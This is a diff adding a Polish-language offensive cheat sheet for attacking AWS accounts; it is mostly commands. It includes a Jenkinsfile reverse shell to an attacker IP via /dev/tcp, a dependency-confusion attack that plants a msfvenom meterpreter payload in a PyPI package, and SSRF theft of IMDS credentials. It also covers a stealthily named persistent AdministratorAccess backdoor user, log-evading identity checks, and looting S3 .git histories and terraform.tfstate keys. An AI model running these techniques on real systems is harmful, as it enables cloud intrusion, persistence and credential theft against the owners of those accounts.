@@ -2093,22 +2093,71 @@ git pull origin main                  # pull
 
 # 13. Cloud — AWS (enumeracja i atak)
 
-> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość. Zawsze w granicach zakresu zaangażowania.
+> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość stała; `ASIA...` + SessionToken = tymczasowa (rola). Zawsze w granicach zakresu.
+
+> 🎯 **Drogowskaz — co po kolei (AWS):**
+> 1. **Bez kluczy** — potwierdź, że to AWS: `host -t ns` + `whois` (`awsdns-*` → Route53, reverse-DNS `ec2-*.compute-1.amazonaws.com` → EC2). §13.1.
+> 2. **Znajdź buckety** — nazwa w źródle strony (DevTools Network / `curl|grep`); stany: **XML=OPEN** · **AccessDenied=istnieje+chroniony** · **NoSuchBucket=brak**. Brute: `cloud_enum -kf`.
+> 3. **Odzyskaj Account ID** (12 cyfr) — z publicznego AMI (`OwnerId`) lub brute `s3:ResourceAccount`; potem sprawdzaj istnienie principali i brute ról w **Pacu** (`iam__enum_roles` → auto-AssumeRole = creds `ASIA...`).
+> 4. **Z kluczami** — kim jestem: `sts get-caller-identity` (cicho: `get-access-key-info` / `lambda invoke` błąd / zmiana `--region`).
+> 5. **Zakres uprawnień** — inline + grupy + wersje managed; jeden `get-account-authorization-details` i filtruj `--query` offline.
+> 6. **Eskaluj** — `iam:CreateAccessKey`/`AddUserToGroup`/`PutUserPolicy`/`AssumeRole`, `*:*`, ABAC-tagi. **Loot**: bucket z `.git` (§13.5), poison CI/CD (§13.6), `terraform.tfstate` (§13.8).
+>
+> 💎 **Co wartościowe:** klucz `AKIA/ASIA...`+secret w źródle/plikach/IMDS/`env` · **12-cyfrowy Account ID** · bucket OPEN · publiczne AMI/snapshoty z sekretami · **`.git` w buckecie** (cała historia!) · `withAWS` w Jenkinsfile · **`terraform.tfstate`** (plaintext IAM admin) · statementy `iam:*`/`*:*` · `get-account-summary`: MFA=0.
 
 ## 13.1 Rozpoznanie bez kluczy (unauthenticated)
+Najpierw potwierdź, że cel to w ogóle AWS:
 ```bash
-cloud_enum -k firma -k firma-prod                    # publiczne buckety S3 i inne zasoby wg nazwy firmy
-aws s3 ls s3://firma-assets-public --no-sign-request # anonimowy listing (gdy public)
-aws s3 cp s3://firma-assets-public/README.md ./ --no-sign-request
-curl http://firma-assets.s3.amazonaws.com/           # listing przez HTTP gdy bucket public
+host -t ns $DOMAIN                                    # nameservery awsdns-* → AWS Route53
+whois awsdns-00.com | grep 'Registrant Organization' # Amazon Technologies Inc.
+host $IP                                              # reverse-DNS ec2-*.compute-1.amazonaws.com → EC2
+whois $IP | grep 'OrgName'                            # OrgName: Amazon...
 ```
-> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>`.
+Znajdź i sklasyfikuj buckety S3 (nazwa często wycieka w źródle strony — DevTools → Network):
+```bash
+curl -s http://$DOMAIN | grep -oP '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com'   # wyłuskaj URL bucketu
+curl -i http://<bucket>.s3.amazonaws.com/            # XML z <Key> = OPEN · AccessDenied = jest+chroniony · NoSuchBucket = brak
+aws s3 ls s3://<bucket> --no-sign-request            # anonimowy listing (gdy public)
+aws s3 cp s3://<bucket>/README.md ./ --no-sign-request
+```
+Brute nazw bucketów (konwencja `org-cel-<8 losowych>`; ten sam suffix bywa reużyty):
+```bash
+cloud_enum -kf keyfile.txt --quickscan --disable-azure --disable-gcp   # -k KEYWORD lub -kf plik; etykiety OPEN vs Protected
+```
+> **Region siedzi w URL bucketu** (`...s3.us-east-1...`) — użyj go w `aws configure`. `AccessDenied` na anon ≠ bucket zamknięty (spróbuj z uwierzytelnieniem — patrz §13.5). Domeny do brute: `s3.amazonaws.com`, `awsapps.com` (AWS), `*.core.windows.net`/`azurewebsites.net` (Azure), `storage.googleapis.com`/`appspot.com` (GCP).
+
+> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>` (IMDSv2: najpierw `PUT .../api/token` z nagłówkiem, potem `GET` z `X-aws-ec2-metadata-token`).
+
+## 13.1b Bez kluczy, ale cross-account (Account ID → principale → role)
+```bash
+# Odzyskaj 12-cyfrowy Account ID:
+aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Cel*"  # OwnerId = Account ID
+# Sprawdź, czy dany user/rola ISTNIEJE w cudzym koncie (cała interakcja w TWOIM koncie):
+aws --profile attacker s3api put-bucket-policy --bucket <mój-dummy> --policy file://grant.json
+#   przechodzi (brak outputu) = principal ISTNIEJE; 'Invalid principal in policy' = NIE istnieje (mylący komunikat!)
+# Brute nazw ról + auto-AssumeRole w Pacu → tymczasowe creds ASIA...:
+pacu
+Pacu> import_keys attacker
+Pacu> run iam__enum_roles --word-list role-names.txt --account-id <AccountID>
+Pacu> run iam__enum_users --word-list user-names.txt --account-id <AccountID>
+```
+> Principal ARN: `arn:aws:iam::<AccountID>:user/<nazwa>` (lub `role/`, `group/`). `iam__enum_roles` przy trafieniu **sam próbuje AssumeRole** → zwraca `ASIA...`+SessionToken (Initial Compromise). Używaj kluczy *attacker* — moduł spamuje **Twój** CloudTrail, cel nic nie widzi. Wordlisty buduj z prefiksów projektów doklejanych do nazw ról.
 
 ## 13.2 Konfiguracja CLI z pozyskanymi kluczami
 ```bash
 aws configure --profile target                       # wklej AKIA..., secret, region (np. us-east-1)
-aws --profile target sts get-caller-identity         # kim jestem (ARN, account id)
-aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz
+aws --profile target sts get-caller-identity         # kim jestem (ARN, account id) — UWAGA: leci do CloudTrail
+aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz (cicho, offline-ish)
+```
+Warianty **stealth** (gdy nie chcesz zapalać `get-caller-identity` w logach celu):
+```bash
+aws --profile target sts get-access-key-info --access-key-id AKIA...   # ujawnia Account ID bez logu u celu
+aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:<acct>:function:nonexistent out.json  # błąd zdradza tożsamość
+aws --profile target sts get-caller-identity --region us-east-2        # zmiana regionu bywa mniej monitorowana
+```
+Dla creds tymczasowych z roli (`ASIA...`) dopisz `aws_session_token` do profilu:
+```bash
+aws configure set aws_session_token "<token>" --profile target
 ```
 ## 13.3 Enumeracja uprawnień (IAM) — dokąd mogę pójść
 ```bash
@@ -2116,10 +2165,13 @@ aws --profile target iam list-users
 aws --profile target iam list-groups
 aws --profile target iam list-roles
 aws --profile target iam list-attached-user-policies --user-name bob
-aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles)
+aws --profile target iam list-user-policies --user-name bob            # polityki INLINE (łatwo przeoczyć)
+aws --profile target iam list-groups-for-user --user-name bob          # grupy → potem list-group-policies
+aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles) — jeden strzał
+aws --profile target iam get-account-summary | grep MFA               # MFADevices=0 = konto bez MFA
 aws --profile target iam get-policy-version --policy-arn <ARN> --version-id v1
 ```
-> Szukaj nadmiarowych uprawnień → ścieżki eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `sts:AssumeRole`, `*:*`.
+> Uprawnienia siedzą w 3 miejscach: **inline** (`list-user-policies`), **managed** (`list-attached-user-policies` + `get-policy-version`), **przez grupy** (`list-groups-for-user`). Zrób jeden `get-account-authorization-details` i filtruj offline: `--query 'UserDetailList[?UserName==\`bob\`]'` / `--filter LocalManagedPolicy`. Szukaj eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `iam:AddUserToGroup`, `sts:AssumeRole`, `*:*`, tagi **ABAC** (`Project=...` sterujące dostępem).
 
 ## 13.4 Ruch dalej / eskalacja (przykłady)
 ```bash
@@ -2137,6 +2189,83 @@ aws --profile target iam put-user-policy --user-name bob --policy-name pe --poli
 aws --profile target iam create-access-key --user-name bob
 ```
 > Automatyzacja audytu/ataku IAM: **Pacu**, **ScoutSuite**, **enumerate-iam**.
+
+**Backdoor-admin (trwały stealth-admin, T1136.003):**
+```bash
+aws --profile compromised iam create-user --user-name terraform-svc      # stealth nazwa, nie "backdoor"
+aws --profile compromised iam attach-user-policy --user-name terraform-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws --profile compromised iam create-access-key --user-name terraform-svc # SecretAccessKey zwracany RAZ — zapisz od razu!
+aws configure --profile backdoor
+```
+> Tworzenie userów leci do CloudTrail — używaj wiarygodnej nazwy. `AdministratorAccess` ARN = `arn:aws:iam::aws:policy/AdministratorAccess`.
+
+## 13.5 S3 misconfig `AuthenticatedUsers` + repo `.git` w buckecie
+> Bucket blokuje anon (`AccessDenied`), ale ACL `AuthenticatedUsers` = **każdy zalogowany user AWS** (nawet z obcego konta) może czytać. Dowolne ważne `AKIA` działają.
+```bash
+curl -i https://<bucket>.s3.<region>.amazonaws.com   # AccessDenied XML = anon zablokowany, ale...
+aws configure                                         # wklej JAKIEKOLWIEK ważne IAM creds
+aws s3 ls s3://<bucket>                               # region MUSI pasować do URL bucketu
+aws s3 sync s3://<bucket> ./loot                      # ściąga CAŁOŚĆ, łącznie z ukrytym .git/
+```
+Jeśli w buckecie jest `.git/` (dirb znajdzie `.git/HEAD` = 200) — masz całe repo z **historią** (usunięte sekrety wciąż ważne!):
+```bash
+head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
+dirb https://<bucket>.s3.<region>.amazonaws.com ./first50.txt     # szuka .git/HEAD
+aws s3 sync s3://<bucket> ./repo                      # NIE brute'uj obiektów git — ściągnij .git i pracuj lokalnie
+cd repo && git log --oneline --all
+git show <commit>                                     # zwłaszcza commity "Fix issue" gdzie usunięto sekret
+echo 'YWRtaW46cGFzcw==' | base64 -d                   # nagłówek Authorization: Basic <b64> = user:pass
+gitleaks detect                                       # POMOCNICZO — "no leaks" NIE kończy tematu, rób ręczny git log/show
+```
+
+## 13.6 Poison the pipeline (CI/CD → RCE → kradzież AWS creds)
+> Masz creds do Gitea/GitLab z sekretów? Edytuj **Jenkinsfile** w repo z webhookiem Git Push → build się odpala → shell na builderze jako `jenkins`.
+```groovy
+pipeline { agent any stages { stage('x') { steps {
+  withAWS(region:'us-east-1', credentials:'aws_key') { script {
+    if (isUnix()) { sh 'bash -c "bash -i >& /dev/tcp/<mójIP>/4242 0>&1" & ' }   // trailing & KONIECZNE (inaczej step timeoutuje)
+  } } } } } }
+```
+```bash
+# Kali z PUBLICZNYM IP (chmurowy) — lokalny nie zadziała:
+sudo systemctl start apache2 && tail -f /var/log/apache2/access.log   # test: sh 'curl http://<mójIP>/x' → sprawdź hit
+nc -nvlp 4242                                         # złap reverse shell
+```
+> Używaj `sh` (nie Groovy — Groovy w sandboxie wymaga script approval). Po shellu na builderze — wyciągnij AWS creds wstrzyknięte przez `withAWS`:
+```bash
+env | grep AWS                                        # AWS_ACCESS_KEY_ID/SECRET → najszybsza droga do chmury
+cat /proc/1/status | grep Cap; capsh --decode=<CapEff> # 3fffffffff = privileged (escape)
+cat /proc/mounts | grep overlay                       # overlay + brak ifconfig = kontener Docker
+```
+
+## 13.7 Dependency confusion (przejęcie prywatnego pakietu pip)
+> Gdy app to Python i używa `extra-index-url` (szuka w OBU indexach, bierze **najwyższą** wersję) — opublikuj na publicznym PyPI wyższą wersję prywatnego pakietu → prod ją zaciągnie.
+```bash
+# OSINT nazwy: requirements.txt / forum / nagłówki Server: Werkzeug (=Python). Sprawdź, że pakiet "brakuje":
+pip download <pakiet>                                 # "No matching distribution" = confusion możliwy
+# Złośliwy pakiet: RCE przy install (setup.py cmdclass) I przy import (utils.py __getattr__ + sys.excepthook)
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<mójIP> LPORT=4488   # dopisz na KONIEC utils.py
+python3 ./setup.py sdist
+twine upload --repository-url http://<pypi.cel>/ -u user -p pass dist/*      # wersja > prywatnej (~=1.1.0 → 1.1.2+)
+# handler: msfconsole -x 'use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4488; set ExitOnSession false; run -jz'
+```
+> Prod przebudowuje zwykle ≤10 min. Nazwa pakietu: `from foo_util import x` → pakiet `foo-util` (dash), moduł `foo_util` (underscore). `remove_pkg` przez `curl --form ':action=remove_pkg'` by posprzątać zły upload.
+
+## 13.8 Terraform state = klucze admina (JACKPOT) + pivot
+> Bucket `tf-state-*` trzyma `terraform.tfstate` = **plaintext** IAM id+secret+polityki. User z `AdministratorAccess` = pełna kompromitacja. Klucze do bucketu bywają w źródle strony Jenkins **S3 Explorer** (client-side JS).
+```bash
+aws --profile stolen s3api list-buckets              # ujawnia bucket tf-state-*
+aws --profile stolen s3 cp s3://tf-state-<x>/terraform.tfstate ./
+cat -n terraform.tfstate                             # grep users + access id + secret + attached policy
+aws configure --profile admin                        # id/secret usera z AdministratorAccess
+aws --profile admin iam list-attached-user-policies --user-name <user>
+```
+Pivot do sieci wewnętrznej z kontenera **bez nmapa** (czysty Python — `socket`/`ipaddress`):
+```bash
+# netscan.py: socket.connect_ex()==0 = open; settimeout(0.2); skanuj /24 nie /16
+python /netscan.py 172.30.0.1/24                      # np. wewnętrzny Jenkins 172.30.0.30:8080
+```
+> ⚠️ **Cleanup labu:** `sudo nmcli connection modify 'Wired connection 1' ipv4.dns '' && sudo systemctl restart NetworkManager` (inaczej psujesz sobie DNS), `rm ~/.pypirc ~/.config/pip/pip.conf`, usuń Firefox SOCKS proxy.
 
 ---
 
